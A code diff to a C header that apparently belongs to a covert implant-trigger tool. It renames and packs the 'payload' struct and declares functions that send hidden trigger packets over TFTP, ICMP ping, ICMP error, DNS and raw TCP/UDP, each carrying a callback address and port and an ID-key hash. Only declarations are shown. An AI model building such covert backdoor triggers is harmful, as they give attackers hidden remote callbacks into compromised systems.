@@ -42,7 +42,7 @@
 #define ID_KEY_HASH_SIZE	20	// Size of SHA-1 hash
 #define ID_KEY_LENGTH_MIN	8	// Minimum character length for a trigger key
 
-/*! \struct payload
+/*! \struct Payload
  *
  * 	\brief	Payload data structure
  *
@@ -51,34 +51,34 @@
  * 	\param uint8_t trigger_key	- Trigger key (SHA-1)
  * 	\param uint16_t crc		- CRC of payload
  */
-typedef struct
+typedef struct __attribute__((packed))
 {
-	uint8_t		seed;					// Obfuscation seed used for triggers other than raw TCP/UDP.
-	in_addr_t	callback_addr;				// the callback for the triggered application, always in net order
-	uint16_t	callback_port;				// callback port, passed to TBOT, always in net order
-	uint8_t		idKey_hash[ID_KEY_HASH_SIZE];	// ID Key hash
-	uint16_t	crc;					// CRC of this payload
-} payload;
+	uint8_t		seed;				// Obfuscation seed used for triggers other than raw TCP/UDP.
+	in_addr_t	callback_addr;			// the callback for the triggered application, always in net order
+	uint16_t	callback_port;			// callback port, passed to TBOT, always in net order
+	unsigned char	idKey_hash[ID_KEY_HASH_SIZE];	// ID Key hash
+	uint16_t	crc;				// CRC of this payload
+} Payload;
 
 /*! \struct trigger_info
 	\brief	The struct containing trigger control parameters
 	
-	\param payload* p	- The 12 byte payload of the trigger
+	\param Payload* p	- The 12 byte payload of the trigger
 	\param trigger_info* ti	- The struct containing trigger-specific parameters
 */
-typedef struct
+typedef struct __attribute__((packed))
 {
 	uint32_t	trigger_type;			// one of the T_<trigger type> defined values
 	in_addr_t	target_addr;			// the destination we are triggering, always in net order
 	in_addr_t	callback_addr;			// the callback for the triggered application, always in net order
 	uint16_t	callback_port;			// callback port, passed to TBOT, always in net order
 	uint16_t	trigger_port;			// for raw triggers, the TCP or UDP port
-	uint8_t		idKey_hash[ID_KEY_HASH_SIZE];	// SHA-1 of ID key
+	unsigned char	idKey_hash[ID_KEY_HASH_SIZE];	// SHA-1 of ID key
 	uint8_t		icmp_error_code;		// used for ICMP error triggers (the opcode of a payload)
 } trigger_info;
 
 // pretty print package
-extern void print_payload (payload * p);
+extern void print_payload (Payload * p);
 
 extern void icmp_generic (ip_hdr * iph);
 
@@ -89,45 +89,45 @@ ping_generic (ip_hdr * ih, icmp_hdr * ich, uint8_t * data, uint32_t fillSZ);
 /*!
 	\brief	Sends an TFTP wrq trigger (1 packet, write request)
 	
-	\param payload* p	- The 12 byte payload of the trigger
+	\param Payload* p	- The 12 byte payload of the trigger
 	\param trigger_info* ti	- The struct containing trigger-specific parameters
 	
 	\return	The success of the call.
 	\retval	SUCCESS (0) success
 	\retval	FAILURE (-1) failure
 */
-extern int trigger_tftp_wrq (payload * p, trigger_info * ti);
+extern int trigger_tftp_wrq (Payload * p, trigger_info * ti);
 
 /*!
 	\brief	Sends an ICMP ping trigger (6 packets in 6 seconds)
 	
-	\param payload* p	- The 12 byte payload of the trigger
+	\param Payload* p	- The 12 byte payload of the trigger
 	\param trigger_info* ti	- The struct containing trigger-specific parameters
 	
 	\return		The success of the call.
 	\retval         SUCCESS (0) success
 	\retval         FAILURE (-1) failure
 */
-extern int trigger_icmp_ping (payload * p, trigger_info * ti);
+extern int trigger_icmp_ping (Payload * p, trigger_info * ti);
 
 /*!
 	\brief	Sends an ICMP error trigger (1 packet, 15 different codes)
 	
-	\param payload* p	- The 12 byte payload of the trigger
+	\param Payload* p	- The 12 byte payload of the trigger
 	\param trigger_info* ti	- The struct containing trigger-specific parameters
 	
 	\return		The success of the call.
 	\retval         SUCCESS (0) success
 	\retval         FAILURE (-1) failure
 */
-extern int trigger_icmp_error (payload * p, trigger_info * ti);
+extern int trigger_icmp_error (Payload * p, trigger_info * ti);
 
-extern int trigger_dns_query (payload * p, trigger_info * ti);
+extern int trigger_dns_query (Payload * p, trigger_info * ti);
 
-//int trigger_raw_udp (payload * p, trigger_info * ti);
+//int trigger_raw_udp (Payload * p, trigger_info * ti);
 
-//int trigger_raw_tcp (payload * p, trigger_info * ti);
+//int trigger_raw_tcp (Payload * p, trigger_info * ti);
 
-unsigned int trigger_raw (payload *p, trigger_info * ti);
+unsigned int trigger_raw (Payload *p, trigger_info * ti);
 
 #endif
